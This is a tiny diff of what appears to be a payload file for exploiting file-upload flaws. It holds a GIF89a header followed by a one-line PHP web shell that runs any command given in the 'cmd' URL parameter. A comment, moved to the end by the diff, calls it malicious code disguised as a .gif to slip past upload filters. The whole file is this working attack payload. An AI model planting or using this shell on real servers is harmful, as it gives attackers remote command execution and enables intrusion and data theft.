@@ -1,4 +1,7 @@
-# This codeing we will using with File Upload RCE Bug type and This code is malicious code with a .gif extension, but it is actually a .php extension. (See the bypass section) ( The section follows the RCE Bug )
 GIF89a;
 <?php echo system($_GET['cmd']); ?>
 
+
+
+
+# This codeing we will using with File Upload RCE Bug type and This code is malicious code with a .gif extension, but it is actually a .php extension. (See the bypass section) ( The section follows the RCE Bug )
